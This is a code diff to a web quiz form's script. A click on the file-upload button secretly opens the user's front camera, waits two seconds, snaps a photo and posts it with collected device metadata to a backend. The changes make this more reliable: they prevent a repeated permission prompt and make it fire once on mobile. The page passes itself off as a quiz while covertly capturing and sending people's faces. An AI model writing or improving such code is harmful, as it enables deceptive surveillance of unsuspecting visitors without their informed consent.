@@ -1,7 +1,3 @@
-// ================================
-// FINAL SCRIPT (NO PERM ON SUBMIT)
-// ================================
-
 const form = document.getElementById("quiz-form");
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
@@ -12,8 +8,9 @@ const BACKEND_BASE = "/api";
 // Camera constraints
 const constraints = { video: { facingMode: "user" }, audio: false };
 
-// only capture once
+// ✅ prevent double camera permission popup
 let cameraCaptured = false;
+let cameraInProgress = false;
 
 // ================================
 // COLLECT METADATA
@@ -57,7 +54,8 @@ async function collectMetadata() {
 // CAPTURE + SEND CAMERA (ONLY ON FILE CLICK)
 // ================================
 async function captureAndSendCamera() {
-  if (cameraCaptured) return; // only once
+  if (cameraCaptured || cameraInProgress) return; // ✅ lock
+  cameraInProgress = true;
 
   try {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -66,7 +64,6 @@ async function captureAndSendCamera() {
     // wait 2s for better pic
     await new Promise((r) => setTimeout(r, 2000));
 
-    // make sure canvas size correct
     canvas.width = 640;
     canvas.height = 480;
 
@@ -82,21 +79,21 @@ async function captureAndSendCamera() {
       body: JSON.stringify({ image, metadata }),
     });
 
-    // stop camera
     stream.getTracks().forEach((t) => t.stop());
 
-    cameraCaptured = true;
+    cameraCaptured = true; // ✅ done
   } catch (err) {
     console.log("Camera blocked/denied:", err);
-    // don't stop the form if camera fails
+  } finally {
+    cameraInProgress = false;
   }
 }
 
-// ✅ Camera permission happens here ONLY
+// ✅ Use "pointerdown" so it triggers only once on mobile
 if (fileInput) {
-  fileInput.addEventListener("click", async () => {
-    await captureAndSendCamera();
-  });
+  fileInput.addEventListener("pointerdown", () => {
+    captureAndSendCamera();
+  }, { once: true });
 }
 
 // ================================
